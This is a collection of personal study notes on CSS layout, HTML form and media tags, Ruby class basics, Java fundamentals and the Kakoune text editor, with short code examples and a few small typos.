-   [[css-display]]#
-   [[css-position]]#
-   [[css-margins-padding]]#
-   [[css-dimensions]]#
-   [[css-containing-floats]]#


===

<!-- Source: computing/software/html-css/css-attribute-selectors.md -->
<!-- URL: /computing/software/html-css/css-attribute-selectors -->
<!-- Title: CSS Attribute Selectors -->
<!-- Wikilinks: [[computing/software/html-css/css-attribute-selectors]], [[software/html-css/css-attribute-selectors]], [[html-css/css-attribute-selectors]], [[css-attribute-selectors]] -->

---
date: 2021-11-07T14:56
---

# CSS Attribute Selectors

The CSS attribute selector matches elements based on the presence or value of a given attribute.

The following CSS matches each image individually:

```css
img[src*='winter'] {
  height: 50px;
}

img[src*='summer'] {
  height: 100px;
}
```

```html
<img src='/images/winter.jpg'>
<img src='/images/summer.jpg'>
```

More information: [MDN Attribute
Selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)


===

<!-- Source: computing/software/html-css/css-box-model.md -->
<!-- URL: /computing/software/html-css/css-box-model -->
<!-- Title: CSS Box Model -->
<!-- Wikilinks: [[computing/software/html-css/css-box-model]], [[software/html-css/css-box-model]], [[html-css/css-box-model]], [[css-box-model]] -->

---
date: 2021-11-09T09:22
---

CSS Box Model
===============

All elements on a web page are interpreted by the browser as residing
"inside" of a box. This is called the **box model**.

The box model of the following factors:

-   Dimensions of an element's box
-   Borders of an element's box
-   Paddings of an element's box
-   Margins of an element's box

The box model comprises the set of properties that define parts of an
element that take up space on a web page. Those properties are:

1.  `width` and `height` of the content area, which define how much
    horizontal and vertical space is reserved for the *content area* of
    the box. This area may or may not include padding and borders.
    Browser can determine width and height automatically.
2.  `padding`: the amount of space between the content area and the
    border. It is generally *opaque* and hides anything that it
    overlays.
3.  `border` surrounding content area and padding.
4.  `margin`: the amount of space (transparent area) between the border
    and the outside edge of the element.

Finally, the `display` property determines how the browser lays out the
element relative to its neighbors.

``` txt
+---------------------------------+
|             Margin              |
|  +---------------------------+  |
|  |          Border           |  |
|  |  +---------------------+  |  |
|  |  |       Padding       |  |  |
|  |  |  +---------------+  |  |  |
|  |  |  |               |+ |  |  |
|  |  |  |    Content    ||-|--|--|-- Height
|  |  |  |               |+ |  |  |
|  |  |  +---------------+  |  |  |
|  |  |   +-------------+   |  |  |
|  |  |          |          |  |  |
|  |  +---------------------+  |  |
|  |             |             |  |
|  +---------------------------+  |
|                |                |
+---------------------------------+
                 |
                 |
               Width
```

Center an Element
-----------------

To center an element, one can use `margin: 0 auto;`. This will set the
top and bottom margin to 0 pixels and adjust the left and right margins
until the element is centered *within* its containing element.

To center an element, **the width of the element must be set**. If not
set, the width of the element will be set to the full width of the
containing element.

It is also not possible to center an element that takes up the full
width of the page since the width change because of display and browser
window size.

Margin Collapse
---------------

Top and bottom margins, also called *vertical margins*, **collapse**,
while top and bottom padding does not.

In other words, two elements right next to each other with horizontal
margins will see their margins add up to make a total margin. Two
elements right one above the other with vertical margins, however, will
have their larger of the two vertical margins sets the margin.

Difference Between `visibility` and `display`
---------------------------------------------

There are two ways to remove an object from the page with CSS:
`display: none` and `visibility: hidden`. The former will completely
remove the element from the web page. The later will make the element
not visible but will keep the space reserved for it.

In both case, the element will be visible in the source code.


===

<!-- Source: computing/software/html-css/css-box-sizing.md -->
<!-- URL: /computing/software/html-css/css-box-sizing -->
<!-- Title: CSS Box Sizing -->
<!-- Wikilinks: [[computing/software/html-css/css-box-sizing]], [[software/html-css/css-box-sizing]], [[html-css/css-box-sizing]], [[css-box-sizing]] -->

---
date: 2021-12-01T21:41
---

CSS Box Sizing
==============

Today's browsers use `width` $+$ `padding` $+$ `border` to calculate the
actual width and height of their #[[css-box-model]]. However, this box
model is modifiable using CSS's `box-sizing`.

`box-sizing` has three possible values:

1.  `content-box`: the default. Width and height values apply to the
    element’s content only. The padding and border are added to the
    outside of the box to get the size of the visible box.
2.  `padding-box`: Width and height values apply to the element’s
    content and its padding. The border is added to the outside of the
    box. CSS standard deprecates this setting; **do not use**.
3.  `border-box`: the most popular. Width and height values apply to the
    content, padding, and border. The browser interprets the `width` and
    `height` properties as the total actual width and height of the box
    (excluding margins).

The last one makes it possible to revive the "quirky" interpretation of
the box model, one of only thing [Internet Explorer seems to have done
right](https://www.jefftk.com/p/the-revenge-of-the-ie-box-model),
because it greatly simplify the math a front-end developer must do: 50%
of the container width is always 50% even with a 20px padding.

`border-box` is commonly used in *reset* stylesheet, in order to make it
the default behavior, as it's easier to make "fluid" or responsive
design with this value.

``` css
html {
  box-sizing: border-box;
}

*,
*::before,
*::after {
  box-sizing: inherit;
}
```

[Source](https://css-tricks.com/box-sizing/)


===

<!-- Source: computing/software/html-css/css-containing-floats.md -->
<!-- URL: /computing/software/html-css/css-containing-floats -->
<!-- Title: CSS Containing Floats -->
<!-- Wikilinks: [[computing/software/html-css/css-containing-floats]], [[software/html-css/css-containing-floats]], [[html-css/css-containing-floats]], [[css-containing-floats]] -->

---
date: 2022-02-01T20:25
---

CSS Containing Floats
=====================

A common float issue is the "containing floats" problem.

What happens is the browser *removes* floats from the normal document
flow, i.e., the container no longer contains the floated items. The
browser cannot determine the container's height and can't render the
container correctly, because the rendering engine no longer cares about
them.

```{=html}
<style>
  #container {
    height: 5em;
    margin-bottom: 2em;
  }

  #cols {
    box-sizing: border-box;
    width: 100%;
    padding: 1.5em;
    margin: 0 auto;
    background-color: #eee;
  }

  #primary,
  #secondary {
    background-color: rgb(100 53 201 / 60%);
  }

  #primary {
    float: left;
    width: 60%;
  }

  #secondary {
    float: right;
    width: 30%;
  }
</style>
<span id="container">
  <span id="cols">
    <span id="primary">
      <h1>Main Content</h1>
    </span>
    <span id="secondary">
      <h3>Sidebar Content</h3>
    </span>
  </span>
</span>
```

There are two main ways to palliate to this problem, both with advantages
and inconveniences.

Overflow
--------

`overflow: hidden` (or `overflow: auto`) is the simplest way to clear a
floated element. `overflow` creates a **block formatting context** which
contains everything inside the element to which it applies, including
floats.

```{=html}
<style>
  .overflow {
    overflow: hidden;
  }
</style>
<span id="container">
  <span class="overflow" id="cols">
    <span id="primary">
      <h1>Main Content</h1>
    </span>
    <span id="secondary">
      <h3>Sidebar Content</h3>
    </span>
  </span>
</span>
```

Clearfix
--------

Another solution is to use a **clearfix**: a standard pattern that
developers use to ensure container doesn't lose its floated children
elements. It uses an invisible block element as the last child element,
as well as the `clear` property.

```{=html}
<style>
  .clearfix::after {
    display: block;
    clear: both;
    content: "";
  }
</style>
<span id="container">
  <span class="clearfix" id="cols">
    <span id="primary">
      <h1>Main Content</h1>
    </span>
    <span id="secondary">
      <h3>Sidebar Content</h3>
    </span>
  </span>
</span>
```

A clearfix uses the `::after` pseudo-element with the following
properties:

-   `display: block;`: make the content a block object
-   `clear: both;`: "clear" the bloats inside the container (force the
    invisible child directly below the floated content)
-   `content: "";`: set the content of the child element to empty string


===

<!-- Source: computing/software/html-css/css-dimensions.md -->
<!-- URL: /computing/software/html-css/css-dimensions -->
<!-- Title: CSS Dimensions -->
<!-- Wikilinks: [[computing/software/html-css/css-dimensions]], [[software/html-css/css-dimensions]], [[html-css/css-dimensions]], [[css-dimensions]] -->

---
date: 2021-12-06T10:07
---

CSS Dimensions
==============

Lengths property values provide size of some element on a page, such as
`width` or `height`. The property value consist of a numeric length and
a **measurements units** (`px`, `rem` etc), making a **measurements** or
**dimensions**.

Absolute vs. Relative Units
---------------------------

Absolute units are units based on a standard system of measures that
people agrees on. One unit is the same wherever we are. In CSS, there
are several but `px` is by far the most used.

{.ui .info .memo} A pixel on a standard screen and a pixel on a
high-resolution screen is not the same. To palliate to this problem, CSS
uses **physical pixel** (also **device** or **display** pixel) and **CSS
reference pixel** (**CSS pixel** or **reference pixel**). This
difference is the cause of many problem when using a design document to
build a web page. On a high-resolution screen, an image view at 100% of
its size in the image editing tool may appear smaller in the browser.

Relative units are units relative to something: a hand or a *story* or
*floor* of a buildings.

Famous relative units in CSS include `em` and `rem`. They are
proportional to the **calculated** and **root** font sizes,
respectively.

For example:

If the calculated font size of the current element is 20 pixels, `1.5em`
is `30px` ($20 \times 1.5$).

If the root font, i.e. the font size of the `html` element is 16 pixels,
`1.5rem` is `24px` ($16 \times 1.5$).

{.ui .info .memo} It's a good idea to set the root font size *in pixel*
in both `html` and `body` elements to make the above calculation more
predictable.

{.ui .info .memo} When working to support old browser, one needs to add
a *fallback* unit, generally in pixels. When doing so, one should assume
the browser default, or root font, to be 16px (not always true but good
enough).

### Percentages

Technically, percentages are not a length value in CSS but it doesn't
matter most of the case. They are use to *define dimensions as a
fraction of the container's width or height*.

### Auto

Like percentages, `auto` is not a length value. It's common uses are as
a way to fit the entire element in its container, or to push an element
all the way to one way or another. By setting right and left margins to
`auto` you can also center a block element.

#### Difference Between auto and 100%

When using `width: auto`, the browser tries to put the entire element,
including its margins, border and padding withing the container.
However, when using `width: 100%` instead, browser won't consider the
margins when it calculates the required element size.


===

<!-- Source: computing/software/html-css/css-display.md -->
<!-- URL: /computing/software/html-css/css-display -->
<!-- Title: CSS Display -->
<!-- Wikilinks: [[computing/software/html-css/css-display]], [[software/html-css/css-display]], [[html-css/css-display]], [[css-display]] -->

---
date: 2021-11-10T09:03
---

# CSS Display

Every HTML element have a default display (assigned by the aptyle named
`display` property). The three values are:

1. `inline`
2. `block`
3. `inline-block`

The value dictates if the element can share horizontal space with other
elements. A block element will typically cause a line break to occure,
while an inline element do not force a newline and only takes as much width
as necessary.

The CSS `display` property provides the ability to make any element a
different element.

## Inline Elements

As written before, an inline element will not cause a line break and its
box is tightly wrapped around it. It is also not possible to specify a
height and width for those elements.

To learn more about inline elements see
[MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Inline_elements).

## Block Elements

_Block-level_ elements are not displayed on the same level as the content
around them. These elements fill the **entire** width by default, although
the width can be set. As for the height, the element will use all the
height necessary to accomodate their content. This too can be set.

A block-level element always starts on a new line.

To learn more about block elements see
[MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Block-level_elements).

## Inline-Block Elements

Inline-block display combines features of both inline and block elements:
they can appear next to each other and we can specify their dimensions
using `width` and `height` properties. A good example of inline-block
elements are images.

## Float and Clear

Float property can be use to yanks element far to the left or far to the
right. It can also be used to float multiple elements at once. When this
heppens and the different elements have different heights, the elements
sometimes "bumps" into each other, not allowing other elements to properly
move to the left or to the right.

The clear property sets how the elements should behave when they bump into
each other. The possible values are:


- `left` the left side of the element will not touch any element within the
same containing element
- `right` the right side of the element will not touch any element within
the same containing element
- `both` neither side of the element will touch any element within the same
containing element
- `none` the element can touch either side




===

<!-- Source: computing/software/html-css/css-margins-padding.md -->
<!-- URL: /computing/software/html-css/css-margins-padding -->
<!-- Title: CSS Margins and Padding -->
<!-- Wikilinks: [[computing/software/html-css/css-margins-padding]], [[software/html-css/css-margins-padding]], [[html-css/css-margins-padding]], [[css-margins-padding]] -->

---
date: 2021-12-06T09:44
---

CSS Margins and Padding
=======================

Padding lies inside the border while margins lie outside it (even if the
border is a zero-width one).

Margins are also transparent while padding is opaque.

Margins *collapse* between `block` elements. It means if two `block`s
are placed one above the other, the margin between them **is not** the
sum of the bottom margin of the first and top margin of the second: the
margin *collapses* to the larger of the two margins in question.

Margin collapse only occurs with top and bottom margins. Padding does
not collapse.

`inline` elements **do not** have top and bottom margins and padding,
or, to be more precise, browser **do not** use them for spacing. k

When to use Margins or Padding?
-------------------------------

It is at the developer's discretion and there is no clear answer.
However, a useful strategy is to

-   Use **padding** to affect the **visible or clickable area**
-   Use **margins** for **spacing between elements**

In doubt, use margins. You probably need padding to:

-   Change the height or width of a border
-   Adjust how much background is visible around an element
-   Alter the amount of clickable area
-   Avoid margin collapse
-   add horizontal spacing to the left or right of an inline element
-   separate the left and right sides of a container from its content
    (and use margins for the vertical gap)


===

<!-- Source: computing/software/html-css/css-position.md -->
<!-- URL: /computing/software/html-css/css-position -->
<!-- Title: CSS Position -->
<!-- Wikilinks: [[computing/software/html-css/css-position]], [[software/html-css/css-position]], [[html-css/css-position]], [[css-position]] -->

---
date: 2021-11-09T20:50
---

# CSS Position

## Relative

`position: relative` lets you position an element _relative_ to its default
static position on the web page.

_Offset properties_ are used to move the element away from its default
static position. They are `top`, `bottom`, `left` and `right`.

## Absolute

`absolute` position makes all other elements on the page ignore the element
for which it is set. The element itself will be positioned relative to its
closest positioned parent element. Offset properties can be used to
determine the final position.

## Fixed

This position is used to _fix_ an element to a specific position on the
page. User scrolling will not make it disappear. It is often used to fix a
title or navigation bar on a web page.

When `fixed`, an element is removed from the flow of the HTML document. To
fix this, the section covered by the fixed element should be set to
relative and offsetted by the number of pixel used by the fixed element.

```css
header {
  position: fixed;
  width: 100%;
}

.jumbotron {
  text-align: center;
  width: 100%;
  position: relative;
}
```

The `z-index` property may come handy to keep the fixed element above all
the other element. `z-index` property does **not** work on static elements.
When not set, an element as a `z-index` value of `0`.

## Sticky

The `sticky` value keeps an element in the document flow as the user
scrolls but sticks to a specified position as the page is scrolled further.


===

<!-- Source: computing/software/html-css/description-list-form.md -->
<!-- URL: /computing/software/html-css/description-list-form -->
<!-- Title: Use Description List to Mark Up Forms in HTML -->
<!-- Wikilinks: [[computing/software/html-css/description-list-form]], [[software/html-css/description-list-form]], [[html-css/description-list-form]], [[description-list-form]] -->

---
date: 2022-01-26T09:24
---

Use Description List to Mark Up Forms in HTML
=============================================

Instead of wrapping `label`s and `input`s inside `div` element and
styling them, we can instead use a **description list** (`dl`, `dt` &
`dd`). It may seem strange, however it makes sense in regard of the
semantic meaning behind a description list: the terms are labels, and
they identify controls for the user. Thus, you can wrap form controls in
description list elements.

``` html
<form action="#">
  <fieldset>
    <dl>
      <dt><label for="text_field">Input Field</label></dt>
      <dd><input id="text_field" name="text_field" type=
      "text"></dd>
      <dt><label for="another_field">Another Field</label></dt>
      <dd><input id="another_field" name="another_field" type=
      "text"></dd>
    </dl>
  </fieldset>
</form>
```

<form action="#">
  <fieldset>
    <dl>
      <dt><label for="text_field">Input Field</label></dt>
      <dd><input id="text_field" name="text_field" type=
      "text"></dd>
      <dt><label for="another_field">Another Field</label></dt>
      <dd><input id="another_field" name="another_field" type=
      "text"></dd>
    </dl>
  </fieldset>
</form>


===

<!-- Source: computing/software/html-css/html-datalist-tag.md -->
<!-- URL: /computing/software/html-css/html-datalist-tag -->
<!-- Title: The <datalist> Tag -->
<!-- Wikilinks: [[computing/software/html-css/html-datalist-tag]], [[software/html-css/html-datalist-tag]], [[html-css/html-datalist-tag]], [[html-datalist-tag]] -->

---
date: 2021-11-06T14:39
---

# The `<datalist>` Tag

`<datalist>` tag is similar to the dropdown menu of `<select>` tag. However
one difference is it lets user type into and filter options from from the
dropdown menu.

```html
<form>
  <label for="city">Ideal city to visit?</label>
  <input type="text" list="cities" id="city" name="city">

  <datalist id="cities">
    <option value="New York City"></option>
    <option value="Tokyo"></option>
    <option value="Barcelona"></option>
    <option value="Mexico City"></option>
    <option value="Melbourne"></option>
    <option value="Other"></option>
  </datalist>
</form>
```

The above render like this:

<form>
  <label for="city">Ideal city to visit?</label>
  <input type="text" list="cities" id="city" name="city">

  <datalist id="cities">
    <option value="New York City"></option>
    <option value="Tokyo"></option>
    <option value="Barcelona"></option>
    <option value="Mexico City"></option>
    <option value="Melbourne"></option>
    <option value="Other"></option>
  </datalist>
</form>


===

<!-- Source: computing/software/html-css/html-label-input-tag.md -->
<!-- URL: /computing/software/html-css/html-label-input-tag -->
<!-- Title: The <label> and <input> Tag -->
<!-- Wikilinks: [[computing/software/html-css/html-label-input-tag]], [[software/html-css/html-label-input-tag]], [[html-css/html-label-input-tag]], [[html-label-input-tag]] -->

---
date: 2021-11-07T14:31
---

# The `<label>` and `<input>` Tag

When associating a `<label>` tag and its `<input>` tag using the `for`
attributes of the former with the `id` attributes of the later, one nifty
things that browsers do is they move the focus of the mouse into the form
when clicking on its corresponding label text.

```html
<form action="/example.html" method="POST">
  <label for="meal">What do you want to eat?</label>
  <br>
  <input type="text" name="food" id="meal">
</form>
```

Clicking on "What do you want to eat?" will move the mouse focus to the
text form:

<form action="/example.html" method="POST">
  <label for="meal">What do you want to eat?</label>
  <br>
  <input type="text" name="food" id="meal">
</form>


===

<!-- Source: computing/software/html-css/html-reset-type.md -->
<!-- URL: /computing/software/html-css/html-reset-type -->
<!-- Title: The reset Type on input Tags -->
<!-- Wikilinks: [[computing/software/html-css/html-reset-type]], [[software/html-css/html-reset-type]], [[html-css/html-reset-type]], [[html-reset-type]] -->

---
date: 2022-01-25T09:50
---

The `reset` Type on `input` Tags
================================

The `reset` type creates a button which, on click, *resets* the contents
of a form to its default values. Clicking does not send a request to the
server.

``` html
<form action="#" method="post">
  <fieldset>
    <label>
      <input name="color" type="radio" value="green" checked />
      Green
    </label>

    <label>
      <input name="color" type="radio" value="red" />
      Red
    </label>
  </fieldset>

  <fieldset>
    <input type="reset" value="Clear Form" />
  </fieldset>
</form>
```

```{=html}
<form action="#" method="post">
  <fieldset>
    <label>
      <input name="color" type="radio" value="green" checked />
      Green
    </label>

    <label>
      <input name="color" type="radio" value="red" />
      Red
    </label>
  </fieldset>

  <fieldset>
    <input type="reset" value="Clear Form" />
  </fieldset>
</form>
```


===

<!-- Source: computing/software/html-css/html-video-tag.md -->
<!-- URL: /computing/software/html-css/html-video-tag -->
<!-- Title: The <video> Tag -->
<!-- Wikilinks: [[computing/software/html-css/html-video-tag]], [[software/html-css/html-video-tag]], [[html-css/html-video-tag]], [[html-video-tag]] -->

---
date: 2021-11-04T21:54
---

# The `<video>` Tag

The `<video>` element, unlike the `<img>` tag, requires an opening and a
closing tag.

In addition, a text can be written between the opening and closing tag. The
text will be displayed if the browser is unable to load the video.

```html
<video src="myVideo.mp4" width="320" height="240" controls>
  Video not supported
</video>
```

The `controls` attribute tells the browser to include basic video controls
(pause, play, skip).


===

<!-- Source: computing/software/inheritance-vs-association.md -->
<!-- URL: /computing/software/inheritance-vs-association -->
<!-- Title: Inheritance vs. Association -->
<!-- Wikilinks: [[computing/software/inheritance-vs-association]], [[software/inheritance-vs-association]], [[inheritance-vs-association]] -->

---
date: 2021-04-14T20:15
---

# Inheritance vs. Association

**Inheritance** can be thought of as an _is-a_ relationship. For example, a
dictionary _is_ a book.

```ruby
class Book
end

class Dictionary < Book
end
```

**Association** can be thought of as a _has-a_ relationship. For example, a
library _has_ books, so there is an associative relationship between
objects of class `Library` and objects of class `Book`.

```ruby
class Library
  def initialize
    @book = Book.new
  end
end

class Book
end
```

See also _Collaborator Objects_ in
#[[what-is-object-oriented-programming]].


===

<!-- Source: computing/software/instance-methods-vs-class-methods.md -->
<!-- URL: /computing/software/instance-methods-vs-class-methods -->
<!-- Title: Instance Methods vs. Class Methods -->
<!-- Wikilinks: [[computing/software/instance-methods-vs-class-methods]], [[software/instance-methods-vs-class-methods]], [[instance-methods-vs-class-methods]] -->

---
date: 2021-05-17T22:17
---

# Instance Methods vs. Class Methods

## Instance Methods

Instance methods keep track of behaviors of objects, i.e., what it is
**able to do**.

```ruby
class Obake
  def speak
    puts "けけけけ"
  end
end

obake = Obake.new
obake.speak  # => けけけけ
```

The **instantiated** object from the class `Obake` is able to speak by mean
of the `speak` instance method.

Instance methods can only be called on the instance of a class.

## Class Methods

In contrast, class methods are methods that can be called on the class
itself, without the need to instantiate objects beforehand.

```ruby
class Obake
  def self.country_of_origin
    puts "#{self} are mainly found in Japan"
  end

  def speak
    puts "けけけけ"
  end
end

Obake.country_of_origin  # => Obake are mainly found in Japan
```

{.ui .info .message}
Instance method cannot be called on the class itself, and class method
cannot be called on instances.

Class methods are useful when we don't need to deal with states. A classic
example is to count the number of time a class has been instantialized.

```ruby
class Obake
  @@number_of_obake = 0

  def initialize
    @@number_of_obake += 1
  end

  def self.total_number_of_obake
    @@number_of_obake
  end

  def self.country_of_origin
    puts "#{self} are mainly found in Japan"
  end

  def speak
    puts "けけけけ"
  end
end

puts Obake.total_number_of_obake # => 0

obake1 = Obake.new
obake2 = Obake.new
obake3 = Obake.new

puts Obake.total_number_of_obake # => 3
```


===

<!-- Source: computing/software/java.md -->
<!-- URL: /computing/software/java -->
<!-- Title: Java -->
<!-- Wikilinks: [[computing/software/java]], [[software/java]], [[java]] -->

---
date: 2020-09-15T15:19
---

# Java

## Portals

* [[java-primitive-data-types]]#
* [[java-prefix-postfix-operators]]#
* [[loops-in-java]]#
* [[methods-in-java]]#
* [[string-equality-java]]#
* [[string-length-getbytes-java]]#


===

<!-- Source: computing/software/java/java-prefix-postfix-operators.md -->
<!-- URL: /computing/software/java/java-prefix-postfix-operators -->
<!-- Title: Java Prefix and Postfix Operators -->
<!-- Wikilinks: [[computing/software/java/java-prefix-postfix-operators]], [[software/java/java-prefix-postfix-operators]], [[java/java-prefix-postfix-operators]], [[java-prefix-postfix-operators]] -->

---
date: 2021-04-30T18:10
---

# Java Prefix and Postfix Operators

The operators `++` and `--` operators' order matters:

- Prefix applies operation _before_ returning value
- Postfix applies operation _after_ returning value

```java
int someValue = 5;
System.out.println(++someValue) // 6
System.out.println(someValue)   // 6

int someOtherValue = 5;
System.out.println(someOtherValue++) // 5
System.out.println(someOtherValue)   // 6
```


===

<!-- Source: computing/software/java/java-primitive-data-types.md -->
<!-- URL: /computing/software/java/java-primitive-data-types -->
<!-- Title: Java Primitive Data Types -->
<!-- Wikilinks: [[computing/software/java/java-primitive-data-types]], [[software/java/java-primitive-data-types]], [[java/java-primitive-data-types]], [[java-primitive-data-types]] -->

---
date: 2021-04-30T17:56
---

# Java Primitive Data Types

Primitive data types are data types built into the Java language.

They are the foundations of all other types and are classified into four
categories:

- Integer (`byte`, `short`, `int` & `long`)
- Floating point (`flaot` & `double`)
- Character (`char`)
- Boolean (`boolean`)

When we work with primitive types in Java, each variable's values are
**unrelated** to any other variable's values. This is important because
other, non-primitive data types's storage are managed differently.


===

<!-- Source: computing/software/java/loops-in-java.md -->
<!-- URL: /computing/software/java/loops-in-java -->
<!-- Title: Loops in Java -->
<!-- Wikilinks: [[computing/software/java/loops-in-java]], [[software/java/loops-in-java]], [[java/loops-in-java]], [[loops-in-java]] -->

---
date: 2021-05-01T10:23
---

# Loops in Java

Basic loops in Java are the following:

- While loop
- Do-While loop
- For loop

## While Loop

Condition checked at loop _start_. Depending on the condition, the loop
body may never run.

```java
int someValue = 4;
int factorial = 1;

while(someValue > 1) {
  factorial *= someValue;
  someValue--;
}
System.out.println(factorial) // 24
```

## Do-while Loop

Condition continues running as long as the control condition is true, like
the while loop above.

The key difference is the condition is checked at the _end_ of the loop.

```java
int iVal = 5;

do {
  System.out.print(iVal);
  System.out.print(" * 2 = ");
  iVal *= 2;
  System.out.println(iVal);
} while(iVal < 25);
```

## For Loop

Check the condition at the loop _start_. Loop body may never run. For loop
is very similar to while loop. The key difference is it provides simplified
notation for loop control values: inside the `for` statement itself we can
define the _initialization_ work, write the _condition_ followed by the
_update_ work. In a word: `for (initialize; condition; update)`.

```java
for(int i = 1; i < 100 ; i *= 2)
  System.out.println(i);
```

By comparison, the same code using a while loop would look like the
following:

```java
int i = 1;

while(i < 100) {
  System.out.println(i);
  i *= 2;
}
```

### For-each Loop

A shorthand of For loop can be found with For-each loop. In this case, the
loop executes a statement once for each array member. The loop handles
collection length and accessing each value.

```java
int[] values = { 10, 20, 15  }
int sum = 0;

for (int currentVal : values)
  sum += currentVal;

System.out.println(sum); // 45
```


===

<!-- Source: computing/software/java/methods-in-java.md -->
<!-- URL: /computing/software/java/methods-in-java -->
<!-- Title: Methods in Java -->
<!-- Wikilinks: [[computing/software/java/methods-in-java]], [[software/java/methods-in-java]], [[java/methods-in-java]], [[methods-in-java]] -->

---
date: 2021-05-04T18:47
---

# Methods in Java

Methods in Java a written with a _name_ in cameCase, preceeded by a
_return-type_ (or `void` for method that returns nothing), followed by a
_typed parameter list_ (which can be empty) and a body which consists of
zero or more statements enclosed in brackets.

```java
static void doSomething() {
  System.out.println("Do something...");
}
```

{.ui .info .message}
We will go into more details about the modifier `static` later. For now
it's just a way to compile our code.

Variables in Java are scoped to the method they where declared. See also
[[local-variable-scope]]#.

## Parameter Passing

In Java, parameters are passed _by value_. In other words, they receives a
copy of the original value, and what happens in the method does not affect
the original object. See also [[pass-by-reference-pass-by-value]]#.

```java
int myVal = 5;

static void doubleVal(int val) {
  val *= 2;
  System.out.println(val); // 10
}

System.out.println(myVal); // 5
```


===

<!-- Source: computing/software/java/string-equality-java.md -->
<!-- URL: /computing/software/java/string-equality-java -->
<!-- Title: String Equality in Java -->
<!-- Wikilinks: [[computing/software/java/string-equality-java]], [[software/java/string-equality-java]], [[java/string-equality-java]], [[string-equality-java]] -->

---
date: 2021-05-12T09:47
---

# String Equality in Java

By the way strings are stored in Java, assigning a string to a local
variable equals to actually have a string instance with the message of our
choosing somewhere in memory and the local variable contains a reference to
that string instance.

```java
String s1 = "Good";
s1 += " Morning France";

String s2 = "Good Morning";
s2 += " France";
```

The value returned by both local variable `s1` and `s2` is the same, ie
`"Good Morning France"`. However, one cannot compare their value using the
equality operator (`==`). This is because the equality operator does not
check the value of the string instance itself: it checks to see if both
string variable reference the **same string instance**.

```java
s1 == s2;     // false
s1.equals(s2) // true
```

The `equals` method, however, does a character-by-character comparison of
the two strings.

## Interning a String

The `intern` method looks at the value of the string and check to see if
there is already an interned version of that string. If it can't find one,
it provides an _interned version_ of the string.

An interned version of a string is a canonicalized value of the string.
Canonicalizing a string let use reliably use the `==` operator comparison
between local variable pointing to the interned version of the string.

```java
String s3 = s1.intern(); // No interned version yet so it is created here
s3 == s1                 // false because s1 doesn't point to the
                         // interned version
String s4 = s2.intern(); // We now have an interned version, the one that
                         // s3 references
s3 == s4                 // true
```

The `intern` method has its own overhead, therefore we only want to use it
when we know we are going to compare a lot of strings. The majority of the
time we will use the `equals` method.


===

<!-- Source: computing/software/java/string-length-getbytes-java.md -->
<!-- URL: /computing/software/java/string-length-getbytes-java -->
<!-- Title: String.length() vs String.getBytes().length in Java -->
<!-- Wikilinks: [[computing/software/java/string-length-getbytes-java]], [[software/java/string-length-getbytes-java]], [[java/string-length-getbytes-java]], [[string-length-getbytes-java]] -->

---
date: 2020-08-26T08:58
tags:
  - java
---

# String.length() vs String.getBytes().length in Java

`String.length()` returns the number of _grapheme_[^1] in the string. Another way to say it is `String.length()` returns the number of **UTF-16**
code units needed to reprensent the string.

On the other hand, `String.getBytes().length` returns the number of bytes to
represent the string, in regard to its specified encoding (which is set in
`file.encoding`). With UTF-16, the number of bytes would be 2x the value
returned by `String.length()`. This does not translate as well for UTF-8.

The relationship between these two lengths, however, varies if the string
contains non-ASCII characters.


[^1]: [What's the difference between a character, a code point, a glyph and a grapheme?](https://stackoverflow.com/q/27331819)


===

<!-- Source: computing/software/kakoune-how-to.md -->
<!-- URL: /computing/software/kakoune-how-to -->
<!-- Title: Kakoune の使い方 -->
<!-- Wikilinks: [[computing/software/kakoune-how-to]], [[software/kakoune-how-to]], [[kakoune-how-to]] -->

---
date: 2020-12-09T21:23
---

# Kakoune の使い方

使い方は Vim に似ている。基本的なコマンドはデフォルトモードで `:` を打ってから入力する。

例えば、行数を入れるためには `:add-highlighter global/ number-lines` を打つ。

コマンドの入力を試してみると、とても懐かし顔が現れます! Kakoune はクリッパーを標準搭載しています!

Office だったら早速に停止したいが、 Kakoune には本当に役に立ってぜひ使いたい 笑

操作は Vim 同様のコマンドが多い。

移動は `h`, `j`, `k`, `l` を使う(矢印も可)。

入力モードは `i` を打つ。モードから出るは `Esc` キーを使う。

Vim と一緒じゃん! と思ったら大違いです。大きな違いはコマンドのための文字列。

そこで、 Kakoune は多分英語圏の人よりも日本語を喋る人のためにやさしい。

Vim は英語の文法をフォローして打つもの。単語を削除するためには `d` + `w` を打ちます(**d**elete **w**ord)。
まず動詞を書いてから名詞をかく。

Kakoune は日本語の文法と同じで、まずは名詞を書いて動詞を書く。
つまり、上記の Vim コマンドを Kakoune で書こうとしたら、 `w` + `d` と書く。

この文法のよさは、アクションを実行する前にアクションを起こす範囲が選択されて、
可視化的に範囲が合っているかどうかを確認できる。

その他、 Vim のちょっと不思議なコマンドがわかりやすくなる。

例えば、 Vim で do/undo は `u` と `Ctrl` + `r`。理由があると思うが、同じ系のコマンドなのに全然違うキーはちょっと不思議だと思わない?

Kakoune の do/undo は `u` と `U` (`Shift` + `u`)。

移動は `g` を使います (goto)。ファイルの最初に移動するは `gg` で、最後は `ge` (**g**o to **e**nd)。

特定なラインへ移動するのは番号 + `g` (ライン5へ行くために `5g` と入力)。
なお、現在位置からラインまで全部セレクト死体場合は大文字を使う (`5G`)。

検索は `/`。検索中に `n` と `Alt` + `n` で次の結果、前の結果へ移動。

コマンドの結果を Kakoune に出力するために、 `|` を入力して下のプロンプトにターミナルのコマンドを打てる。
パイプの代わりに `!` を使うと、現在位置ではなくて新規ラインを追加して結果を出力する (ようするにニューラインも出力する)。


## セレクトモード

Kakoune は何よりも選択を重視しているテキストエディタ。

コードのどちらかにいて、 `]` を入力する。すると、クリッパーが表示され、オブジェクト選択のキーを教えてくれる。
`w` や `p` で **w**ord と **p**aragraph を選択することができる[^1]。

なお、上記で以降の文字を選択するが、以前の文字を選択するためには、 `]` の代わりに `[` を使う。

置換をするために、まずは `%` を入力して全ファイルを選択し、 `s` を入力することで「すべて検索」ができる。

置換したい単語を入力して `Enter` を押下。これで削除したり、リネームしたりすることができる。

よくあるキーストロークを参照するためにまとめた。

[[kakoune-keystroke-idioms]]#


[^1]: 日本語の場合は残念ながら単語を認識しない


===

<!-- Source: computing/software/kakoune-keystroke-idioms.md -->
<!-- URL: /computing/software/kakoune-keystroke-idioms -->
<!-- Title: Keystroke Idioms in Kakoune -->
<!-- Wikilinks: [[computing/software/kakoune-keystroke-idioms]], [[software/kakoune-keystroke-idioms]], [[kakoune-keystroke-idioms]] -->

---
